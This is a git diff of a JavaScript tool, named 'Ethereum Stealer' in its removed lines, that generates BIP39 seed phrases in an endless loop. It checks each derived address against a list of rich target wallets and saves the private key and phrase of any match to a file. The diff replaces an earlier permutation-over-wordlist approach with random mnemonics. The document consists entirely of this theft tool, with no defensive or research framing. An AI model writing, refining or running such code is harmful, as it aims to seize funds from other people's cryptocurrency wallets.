@@ -1,10 +1,5 @@
-"use strict";
-
-process.title = "Ethereum Stealer by Michal2SAB";
-
-const genEth = require("ethers");
+const ethers = require("ethers");
 const fs = require("fs");
-const Wallet = require("ethereumjs-wallet").default;
 const bip39 = require("bip39");
 
 let file_count = 0;
@@ -18,38 +13,18 @@ riches
   .split("\n")
   .forEach((address) => addresses.set(address, true));
 
-const seeds_text = fs.readFileSync("./seeds.txt");
-const seeds = seeds_text.toString().split("\n");
-
-let is_used = [];
-for (let i = 0; i < seeds.length; i++) {
-  is_used[i] = 0;
-}
-
-function makeRandomSeeds(array, cnt) {
-  if (cnt == 12) {
-    return array;
-  }
-  for (let i = 0; i < seeds.length; i++) {
-    if (!is_used[i]) {
-      array[cnt] = seeds[i];
-      makeRandomSeeds(array, cnt + 1);
-    }
-  }
-}
-
-function generate(array) {
+function generate(seedPhrase) {
   count_1++;
   if (count_1 == 1000000) {
     count_1 = 0;
     mil_count++;
     console.log(mil_count, "e6 mined");
   }
-  const seedPhrase = array.join(" ");
-  const seed = bip39.mnemonicToSeedSync(seedPhrase);
-  const wallet = Wallet.fromSeed(seed);
-  const privateKey = wallet.getPrivateKey().toString("hex");
-  const address = "0x" + wallet.getAddress().toString("hex");
+
+  var wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+
+  const privateKey = wallet.privateKey;
+  const address = wallet.address;
 
   if (addresses.has(address)) {
     console.log("");
@@ -64,7 +39,7 @@ function generate(array) {
       "\n\nPrivate Key: " +
       privateKey +
       "\n\n12 word phrase: " +
-      phrase;
+      seedPhrase;
     fs.writeFileSync(
       `./result/Success${file_count++}.txt`,
       successString,
@@ -75,31 +50,8 @@ function generate(array) {
   }
 }
 
-// function generate() {
-// count_1++;
-// if (count_1 == 1000000) {
-//   count_1 = 0;
-//   mil_count++;
-//   console.log(mil_count, "e6 mined");
-// }
-//   var phrase = genEth.Wallet.createRandom().mnemonic.phrase;
-//   var wallet = genEth.Wallet.fromMnemonic(phrase);
-//   // addresses.has(wallet.address);
-// if (addresses.has(wallet.address)) {
-//   console.log("");
-//   process.stdout.write("\x07");
-//   console.log("\x1b[32m%s\x1b[0m", ">> Success: " + wallet.address);
-//   let successString =
-//     "Wallet: " +
-//     wallet.address +
-//     "\n\nPrivate Key: " +
-//     wallet.privateKey +
-//     "\n\n12 word phrase: " +
-//     phrase;
-//   fs.writeFileSync(`./result/Success${file_count++}.txt`, successString, (err) => {
-//     if (err) throw err;
-//   });
-// }
-// }
-
-makeRandomSeeds([], 0);
+while (1) {
+  const bip39 = require("bip39");
+  const seedPhrase = bip39.generateMnemonic();
+  generate(seedPhrase);
+}
